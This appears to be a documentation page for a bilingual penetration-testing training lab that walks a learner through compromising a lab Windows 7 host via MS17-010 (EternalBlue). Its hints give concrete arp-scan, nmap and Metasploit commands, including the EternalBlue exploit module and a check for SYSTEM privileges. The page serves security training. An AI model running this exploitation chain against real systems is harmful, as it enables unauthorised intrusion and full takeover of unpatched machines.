# Lab 03 — EternalBlue / MS17-010
**File:** `src/laboratorios/laboratorio03.ts`
**Date:** 2026-04-02
**Difficulty:** Easy
**Category:** Network
**Network Range:** 172.16.0.0/24
**Target:** 172.16.0.11 (WIN7-TARGET)

---

## Steps (5 missions)

### 01 — Network Reconnaissance
**Text:** Discover hosts on the network
**Text ES:** Descubrí los hosts en la red
**Discovery Level:** 1
**Hint 1 (tool):** Use arp-scan / Usá arp-scan
**Hint 2 (command):** `arp-scan 172.16.0.0/24`
**Validation:** discoveredHosts (minHosts: 1)

### 02 — Port Scanning
**Text:** Identify the services running on the target
**Text ES:** Identificá los servicios que corren en el objetivo
**Discovery Level:** 2
**Hint 1 (tool):** Use nmap / Usá nmap
**Hint 2 (command):** `nmap -sV 172.16.0.11`
**Validation:** scanResults (port: 445)
**Expected:** Windows 7 Professional SP1 x64, SMB on port 445, MSRPC on 135, 49152, netbios-ssn on 139

### 03 — Verify Vulnerability
**Text:** Check if the target is vulnerable to MS17-010
**Text ES:** Verificá si el objetivo es vulnerable a MS17-010
**Discovery Level:** 2
**Hint 1 (tool):** Use Metasploit modules / Usá módulos de Metasploit
**Hint 2 (command):** `msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run` / `msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run`
**Validation:** vulnerabilityFound (vulnId: MS17-010)

### 04 — Exploit EternalBlue
**Text:** Exploit the MS17-010 vulnerability to gain access
**Text ES:** Explotá la vulnerabilidad MS17-010 para obtener acceso
**Discovery Level:** 3
**Hint 1 (tool):** Use the EternalBlue exploit / Usá el exploit EternalBlue
**Hint 2 (command):** `use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST <local-ip> → exploit` / `use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST <local-ip> → exploit`
**Validation:** exploit

### 05 — Verify SYSTEM Access
**Text:** Verify that you have obtained SYSTEM privileges
**Text ES:** Verificá que obtuviste privilegios SYSTEM
**Discovery Level:** 4
**Hint 1 (tool):** Check your user id in meterpreter / Verificá tu ID de usuario en meterpreter
**Hint 2 (command):** `getuid`
**Validation:** uidChecked (isSystem: true)
**Expected:** NT AUTHORITY\SYSTEM
